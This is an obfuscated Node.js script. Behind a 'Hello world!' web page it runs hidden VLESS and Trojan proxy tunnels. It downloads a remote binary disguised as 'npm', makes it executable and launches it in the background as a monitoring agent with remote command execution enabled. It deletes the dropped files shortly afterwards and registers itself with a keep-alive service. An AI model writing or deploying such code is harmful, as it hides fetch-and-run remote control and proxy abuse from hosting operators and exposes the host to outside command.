const _0x3b46a9=_0x34cb;(function(_0x5a18bc,_0x545ac1){const _0x22dc23=_0x34cb,_0x4816fb=_0x5a18bc();while(!![]){try{const _0x549a46=-parseInt(_0x22dc23(0x167))/0x1+parseInt(_0x22dc23(0x1a1))/0x2*(parseInt(_0x22dc23(0x15e))/0x3)+-parseInt(_0x22dc23(0x1c1))/0x4*(parseInt(_0x22dc23(0x166))/0x5)+parseInt(_0x22dc23(0x17d))/0x6*(parseInt(_0x22dc23(0x1b3))/0x7)+-parseInt(_0x22dc23(0x19f))/0x8+parseInt(_0x22dc23(0x152))/0x9*(parseInt(_0x22dc23(0x185))/0xa)+parseInt(_0x22dc23(0x169))/0xb;if(_0x549a46===_0x545ac1)break;else _0x4816fb['push'](_0x4816fb['shift']());}catch(_0x25b614){_0x4816fb['push'](_0x4816fb['shift']());}}}(_0x5926,0xabc81));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3b46a9(0x1be)),net=require('net'),path=require('path'),crypto=require(_0x3b46a9(0x17f)),{Buffer}=require(_0x3b46a9(0x14f)),{exec,execSync}=require(_0x3b46a9(0x172)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3b46a9(0x1c5)][_0x3b46a9(0x1bb)]||_0x3b46a9(0x155),NEZHA_SERVER=process[_0x3b46a9(0x1c5)][_0x3b46a9(0x1b2)]||'',NEZHA_PORT=process[_0x3b46a9(0x1c5)][_0x3b46a9(0x153)]||'',NEZHA_KEY=process[_0x3b46a9(0x1c5)][_0x3b46a9(0x162)]||'',DOMAIN=process['env'][_0x3b46a9(0x19e)]||_0x3b46a9(0x17a),AUTO_ACCESS=process['env'][_0x3b46a9(0x17e)]||!![],WSPATH=process[_0x3b46a9(0x1c5)][_0x3b46a9(0x198)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x3b46a9(0x1c5)][_0x3b46a9(0x1c9)]||_0x3b46a9(0x1b7),NAME=process[_0x3b46a9(0x1c5)][_0x3b46a9(0x168)]||'Hug',PORT=process[_0x3b46a9(0x1c5)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1dbb1a=_0x3b46a9;try{const _0xdf16a5=await axios[_0x1dbb1a(0x1bc)](_0x1dbb1a(0x184)),_0x5de135=_0xdf16a5['data'];ISP=(_0x5de135[_0x1dbb1a(0x160)]+'-'+_0x5de135['asOrganization'])[_0x1dbb1a(0x1a9)](/ /g,'_');}catch(_0x2b265e){ISP=_0x1dbb1a(0x1ba);}};GetISP();const httpServer=http['createServer']((_0x596523,_0x1a3179)=>{const _0x405e7d=_0x3b46a9;if(_0x596523[_0x405e7d(0x18a)]==='/'){const _0x26a106=path[_0x405e7d(0x1c3)](__dirname,'index.html');fs[_0x405e7d(0x174)](_0x26a106,'utf8',(_0x527c62,_0x4d50de)=>{const _0x3e09ec=_0x405e7d;if(_0x527c62){_0x1a3179[_0x3e09ec(0x1a3)](0xc8,{'Content-Type':_0x3e09ec(0x15d)}),_0x1a3179['end'](_0x3e09ec(0x16c));return;}_0x1a3179[_0x3e09ec(0x1a3)](0xc8,{'Content-Type':_0x3e09ec(0x15d)}),_0x1a3179[_0x3e09ec(0x195)](_0x4d50de);});return;}else{if(_0x596523[_0x405e7d(0x18a)]==='/'+SUB_PATH){const _0x11359a='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x405e7d(0x173)+WSPATH+'#'+NAME+'-'+ISP,_0x4aa9c7=_0x405e7d(0x154)+UUID+'@'+DOMAIN+_0x405e7d(0x163)+DOMAIN+_0x405e7d(0x192)+DOMAIN+_0x405e7d(0x173)+WSPATH+'#'+NAME+'-'+ISP,_0x4691a0=_0x11359a+'\x0a'+_0x4aa9c7,_0x504efc=Buffer['from'](_0x4691a0)['toString'](_0x405e7d(0x1af));_0x1a3179[_0x405e7d(0x1a3)](0xc8,{'Content-Type':_0x405e7d(0x14c)}),_0x1a3179['end'](_0x504efc+'\x0a');}else _0x1a3179[_0x405e7d(0x1a3)](0x194,{'Content-Type':_0x405e7d(0x14c)}),_0x1a3179[_0x405e7d(0x195)](_0x405e7d(0x15c));}}),wss=new WebSocket[(_0x3b46a9(0x1ad))]({'server':httpServer}),uuid=UUID[_0x3b46a9(0x1a9)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x3b46a9(0x1a6)];function resolveHost(_0x2a16c4){return new Promise((_0x2dcb13,_0x443c62)=>{const _0x2a6b1a=_0x34cb;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2a6b1a(0x177)](_0x2a16c4)){_0x2dcb13(_0x2a16c4);return;}let _0x1d9cc8=0x0;function _0x52caf8(){const _0x458534=_0x2a6b1a;if(_0x1d9cc8>=DNS_SERVERS[_0x458534(0x181)]){_0x443c62(new Error('Failed\x20to\x20resolve\x20'+_0x2a16c4+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x40f2dd=DNS_SERVERS[_0x1d9cc8];_0x1d9cc8++;const _0x357a2a=_0x458534(0x196)+encodeURIComponent(_0x2a16c4)+'&type=A';axios[_0x458534(0x1bc)](_0x357a2a,{'timeout':0x1388,'headers':{'Accept':_0x458534(0x16d)}})[_0x458534(0x182)](_0x3ad72a=>{const _0x4ca8a8=_0x458534,_0x28c487=_0x3ad72a['data'];if(_0x28c487['Status']===0x0&&_0x28c487[_0x4ca8a8(0x183)]&&_0x28c487['Answer'][_0x4ca8a8(0x181)]>0x0){const _0x5f1b66=_0x28c487['Answer'][_0x4ca8a8(0x1ab)](_0x1672c9=>_0x1672c9[_0x4ca8a8(0x1c0)]===0x1);if(_0x5f1b66){_0x2dcb13(_0x5f1b66[_0x4ca8a8(0x165)]);return;}}_0x52caf8();})['catch'](_0x338a0c=>{_0x52caf8();});}_0x52caf8();});}function handleVlessConnection(_0x231e20,_0x493f4b){const _0x161a01=_0x3b46a9,[_0x4c6e82]=_0x493f4b,_0x216bed=_0x493f4b[_0x161a01(0x1a5)](0x1,0x11);if(!_0x216bed['every']((_0x17100d,_0x27591e)=>_0x17100d==parseInt(uuid[_0x161a01(0x1bf)](_0x27591e*0x2,0x2),0x10)))return![];let _0x140c61=_0x493f4b[_0x161a01(0x1a5)](0x11,0x12)[_0x161a01(0x186)]()+0x13;const _0x1affd8=_0x493f4b[_0x161a01(0x1a5)](_0x140c61,_0x140c61+=0x2)[_0x161a01(0x180)](0x0),_0xe44020=_0x493f4b[_0x161a01(0x1a5)](_0x140c61,_0x140c61+=0x1)[_0x161a01(0x186)](),_0x5a82a7=_0xe44020==0x1?_0x493f4b[_0x161a01(0x1a5)](_0x140c61,_0x140c61+=0x4)['join']('.'):_0xe44020==0x2?new TextDecoder()[_0x161a01(0x14b)](_0x493f4b[_0x161a01(0x1a5)](_0x140c61+0x1,_0x140c61+=0x1+_0x493f4b[_0x161a01(0x1a5)](_0x140c61,_0x140c61+0x1)[_0x161a01(0x186)]())):_0xe44020==0x3?_0x493f4b[_0x161a01(0x1a5)](_0x140c61,_0x140c61+=0x10)[_0x161a01(0x157)]((_0x1f8939,_0x50539d,_0x408e7f,_0x2070ef)=>_0x408e7f%0x2?_0x1f8939[_0x161a01(0x1b9)](_0x2070ef[_0x161a01(0x1a5)](_0x408e7f-0x1,_0x408e7f+0x1)):_0x1f8939,[])[_0x161a01(0x158)](_0x101b37=>_0x101b37[_0x161a01(0x180)](0x0)[_0x161a01(0x1b8)](0x10))['join'](':'):'';_0x231e20[_0x161a01(0x199)](new Uint8Array([_0x4c6e82,0x0]));const _0x1395e7=createWebSocketStream(_0x231e20);return resolveHost(_0x5a82a7)['then'](_0x386bac=>{const _0x5edb75=_0x161a01;net[_0x5edb75(0x14d)]({'host':_0x386bac,'port':_0x1affd8},function(){const _0x4253c=_0x5edb75;this[_0x4253c(0x1c8)](_0x493f4b[_0x4253c(0x1a5)](_0x140c61)),_0x1395e7['on'](_0x4253c(0x18c),()=>{})[_0x4253c(0x175)](this)['on'](_0x4253c(0x18c),()=>{})[_0x4253c(0x175)](_0x1395e7);})['on']('error',()=>{});})[_0x161a01(0x17c)](_0x296899=>{const _0x5c2f77=_0x161a01;net[_0x5c2f77(0x14d)]({'host':_0x5a82a7,'port':_0x1affd8},function(){const _0xdd6d67=_0x5c2f77;this[_0xdd6d67(0x1c8)](_0x493f4b[_0xdd6d67(0x1a5)](_0x140c61)),_0x1395e7['on'](_0xdd6d67(0x18c),()=>{})[_0xdd6d67(0x175)](this)['on'](_0xdd6d67(0x18c),()=>{})[_0xdd6d67(0x175)](_0x1395e7);})['on'](_0x5c2f77(0x18c),()=>{});}),!![];}function _0x34cb(_0x7dec1a,_0x5b5a35){_0x7dec1a=_0x7dec1a-0x14b;const _0x59263f=_0x5926();let _0x34cb85=_0x59263f[_0x7dec1a];return _0x34cb85;}function handleTrojanConnection(_0x423b8d,_0x50da8f){const _0x349399=_0x3b46a9;try{if(_0x50da8f[_0x349399(0x181)]<0x3a)return![];const _0x5cc7ab=_0x50da8f[_0x349399(0x1a5)](0x0,0x38)['toString'](),_0x164b88=[UUID];let _0x7793ec=null;for(const _0x188892 of _0x164b88){const _0x4b7182=crypto[_0x349399(0x156)](_0x349399(0x194))[_0x349399(0x159)](_0x188892)[_0x349399(0x161)]('hex');if(_0x4b7182===_0x5cc7ab){_0x7793ec=_0x188892;break;}}if(!_0x7793ec)return![];let _0x2446bb=0x38;_0x50da8f[_0x2446bb]===0xd&&_0x50da8f[_0x2446bb+0x1]===0xa&&(_0x2446bb+=0x2);const _0x4731f7=_0x50da8f[_0x2446bb];if(_0x4731f7!==0x1)return![];_0x2446bb+=0x1;const _0x2d4899=_0x50da8f[_0x2446bb];_0x2446bb+=0x1;let _0x1180a7,_0x31f3df;if(_0x2d4899===0x1)_0x1180a7=_0x50da8f['slice'](_0x2446bb,_0x2446bb+0x4)[_0x349399(0x1c3)]('.'),_0x2446bb+=0x4;else{if(_0x2d4899===0x3){const _0x2c4023=_0x50da8f[_0x2446bb];_0x2446bb+=0x1,_0x1180a7=_0x50da8f[_0x349399(0x1a5)](_0x2446bb,_0x2446bb+_0x2c4023)['toString'](),_0x2446bb+=_0x2c4023;}else{if(_0x2d4899===0x4)_0x1180a7=_0x50da8f[_0x349399(0x1a5)](_0x2446bb,_0x2446bb+0x10)[_0x349399(0x157)]((_0x181e36,_0x4c0089,_0x455866,_0x73c68f)=>_0x455866%0x2?_0x181e36[_0x349399(0x1b9)](_0x73c68f[_0x349399(0x1a5)](_0x455866-0x1,_0x455866+0x1)):_0x181e36,[])[_0x349399(0x158)](_0x309e7d=>_0x309e7d[_0x349399(0x180)](0x0)[_0x349399(0x1b8)](0x10))[_0x349399(0x1c3)](':'),_0x2446bb+=0x10;else return![];}}_0x31f3df=_0x50da8f['readUInt16BE'](_0x2446bb),_0x2446bb+=0x2;_0x2446bb<_0x50da8f['length']&&_0x50da8f[_0x2446bb]===0xd&&_0x50da8f[_0x2446bb+0x1]===0xa&&(_0x2446bb+=0x2);const _0x1fd0d7=createWebSocketStream(_0x423b8d);return resolveHost(_0x1180a7)[_0x349399(0x182)](_0x5815bf=>{const _0x137a61=_0x349399;net[_0x137a61(0x14d)]({'host':_0x5815bf,'port':_0x31f3df},function(){const _0x2c015a=_0x137a61;_0x2446bb<_0x50da8f['length']&&this[_0x2c015a(0x1c8)](_0x50da8f['slice'](_0x2446bb)),_0x1fd0d7['on']('error',()=>{})[_0x2c015a(0x175)](this)['on'](_0x2c015a(0x18c),()=>{})[_0x2c015a(0x175)](_0x1fd0d7);})['on'](_0x137a61(0x18c),()=>{});})[_0x349399(0x17c)](_0x1ff26e=>{const _0x42978c=_0x349399;net[_0x42978c(0x14d)]({'host':_0x1180a7,'port':_0x31f3df},function(){const _0x7dd7da=_0x42978c;_0x2446bb<_0x50da8f[_0x7dd7da(0x181)]&&this[_0x7dd7da(0x1c8)](_0x50da8f[_0x7dd7da(0x1a5)](_0x2446bb)),_0x1fd0d7['on'](_0x7dd7da(0x18c),()=>{})[_0x7dd7da(0x175)](this)['on'](_0x7dd7da(0x18c),()=>{})[_0x7dd7da(0x175)](_0x1fd0d7);})['on'](_0x42978c(0x18c),()=>{});}),!![];}catch(_0xe19d0e){return![];}}wss['on'](_0x3b46a9(0x178),(_0x5ec494,_0x32c51d)=>{const _0x36a728=_0x3b46a9,_0x41d9fa=_0x32c51d['url']||'';_0x5ec494[_0x36a728(0x1c2)](_0x36a728(0x151),_0xb03e30=>{const _0xcc1f20=_0x36a728;if(_0xb03e30['length']>0x11&&_0xb03e30[0x0]===0x0){const _0x9264d8=_0xb03e30[_0xcc1f20(0x1a5)](0x1,0x11),_0x55c37a=_0x9264d8[_0xcc1f20(0x1b6)]((_0xfd5c7c,_0x2d228)=>_0xfd5c7c==parseInt(uuid['substr'](_0x2d228*0x2,0x2),0x10));if(_0x55c37a){!handleVlessConnection(_0x5ec494,_0xb03e30)&&_0x5ec494[_0xcc1f20(0x16f)]();return;}}!handleTrojanConnection(_0x5ec494,_0xb03e30)&&_0x5ec494[_0xcc1f20(0x16f)]();})['on'](_0x36a728(0x18c),()=>{});});const getDownloadUrl=()=>{const _0x5a251f=_0x3b46a9,_0x5256f9=os['arch']();return _0x5256f9===_0x5a251f(0x197)||_0x5256f9===_0x5a251f(0x15f)||_0x5256f9===_0x5a251f(0x1a2)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x5a251f(0x17b):!NEZHA_PORT?_0x5a251f(0x187):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x384b92=_0x3b46a9;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x310ead=getDownloadUrl(),_0x10ed4d=await axios({'method':_0x384b92(0x1bc),'url':_0x310ead,'responseType':_0x384b92(0x171)}),_0x29bc80=fs['createWriteStream'](_0x384b92(0x16a));return _0x10ed4d[_0x384b92(0x165)][_0x384b92(0x175)](_0x29bc80),new Promise((_0x55a605,_0x1874fa)=>{const _0x119d79=_0x384b92;_0x29bc80['on'](_0x119d79(0x1b1),()=>{const _0x44cd17=_0x119d79;console[_0x44cd17(0x19c)](_0x44cd17(0x18d)),exec(_0x44cd17(0x1ae),_0x598d59=>{if(_0x598d59)_0x1874fa(_0x598d59);_0x55a605();});}),_0x29bc80['on']('error',_0x1874fa);});}catch(_0x2f4dc5){throw _0x2f4dc5;}},runnz=async()=>{const _0x4b8ef0=_0x3b46a9;try{const _0x29af4a=execSync(_0x4b8ef0(0x190),{'encoding':_0x4b8ef0(0x15a)});if(_0x29af4a['trim']()!==''){console['log'](_0x4b8ef0(0x1a0));return;}}catch(_0x5bf444){}await downloadFile();let _0x4d4950='',_0x28d6f3=[_0x4b8ef0(0x179),_0x4b8ef0(0x16e),_0x4b8ef0(0x1a4),_0x4b8ef0(0x18e),_0x4b8ef0(0x1c6),_0x4b8ef0(0x19a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x286a65=_0x28d6f3['includes'](NEZHA_PORT)?_0x4b8ef0(0x16b):'';_0x4d4950=_0x4b8ef0(0x193)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4b8ef0(0x1b0)+NEZHA_KEY+'\x20'+_0x286a65+_0x4b8ef0(0x15b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x37aec1=NEZHA_SERVER[_0x4b8ef0(0x164)](':')?NEZHA_SERVER[_0x4b8ef0(0x170)](':')[_0x4b8ef0(0x1b5)]():'',_0x51f685=_0x28d6f3[_0x4b8ef0(0x164)](_0x37aec1)?_0x4b8ef0(0x19d):'false',_0x4580bc=_0x4b8ef0(0x18f)+NEZHA_KEY+_0x4b8ef0(0x1b4)+NEZHA_SERVER+_0x4b8ef0(0x1a8)+_0x51f685+_0x4b8ef0(0x189)+UUID;fs[_0x4b8ef0(0x176)](_0x4b8ef0(0x1c4),_0x4580bc);}_0x4d4950='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x4b8ef0(0x19c)](_0x4b8ef0(0x19b));return;}}try{exec(_0x4d4950,{'shell':_0x4b8ef0(0x1c7)},_0x23b3d9=>{const _0x547647=_0x4b8ef0;if(_0x23b3d9)console[_0x547647(0x18c)](_0x547647(0x188),_0x23b3d9);else console['log'](_0x547647(0x18b));});}catch(_0x58195e){console[_0x4b8ef0(0x18c)](_0x4b8ef0(0x1a7)+_0x58195e);}};async function addAccessTask(){const _0x80dcf8=_0x3b46a9;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x523b4a=_0x80dcf8(0x14e)+DOMAIN;try{const _0x19f055=await axios[_0x80dcf8(0x150)](_0x80dcf8(0x1bd),{'url':_0x523b4a},{'headers':{'Content-Type':'application/json'}});console[_0x80dcf8(0x19c)](_0x80dcf8(0x1aa));}catch(_0x35cd21){}}function _0x5926(){const _0x349625=['NEZHA_KEY',':443?security=tls&sni=','includes','data','5pEAlDK','1020488tVPrgp','NAME','13641595tUqgQl','npm','--tls','Hello\x20world!','application/dns-json','8443','close','split','stream','child_process','&path=%2F','readFile','pipe','writeFileSync','test','connection','443','1234.abc.com','https://arm64.ssss.nyc.mn/agent','catch','27480wVErbC','AUTO_ACCESS','crypto','readUInt16BE','length','then','Answer','https://speed.cloudflare.com/meta','730OdxAFF','readUInt8','https://amd64.ssss.nyc.mn/v1','npm\x20running\x20error:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','url','npm\x20is\x20running','error','npm\x20download\x20successfully','2087','client_secret:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','listen','&fp=chrome&type=ws&host=','setsid\x20nohup\x20./npm\x20-s\x20','sha224','end','https://dns.google/resolve?name=','arm','WSPATH','send','2053','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','log','true','DOMAIN','6210360bDbXIW','npm\x20is\x20already\x20running,\x20skip\x20running...','19814bwfZXJ','aarch64','writeHead','2096','slice','1.1.1.1','error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','replace','Automatic\x20Access\x20Task\x20added\x20successfully','find','unlink','Server','chmod\x20+x\x20npm','base64','\x20-p\x20','finish','NEZHA_SERVER','707OTeNol','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','pop','every','sub','toString','concat','Unknown','UUID','get','https://oooo.serv00.net/add-url','axios','substr','type','1242316PUjZcT','once','join','config.yaml','env','2083','/bin/bash','write','SUB_PATH','decode','text/plain','connect','https://','buffer','post','message','130527DTaYpH','NEZHA_PORT','trojan://','2a4d25b0-d4cd-4231-b31f-1b777470a429','createHash','reduce','map','update','utf-8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Not\x20Found\x0a','text/html','15rKtgrr','arm64','country','digest'];_0x5926=function(){return _0x349625;};return _0x5926();}const delFiles=()=>{const _0x4442df=_0x3b46a9;fs[_0x4442df(0x1ac)](_0x4442df(0x16a),()=>{}),fs[_0x4442df(0x1ac)](_0x4442df(0x1c4),()=>{});};httpServer[_0x3b46a9(0x191)](PORT,()=>{const _0x47c460=_0x3b46a9;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x47c460(0x19c)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
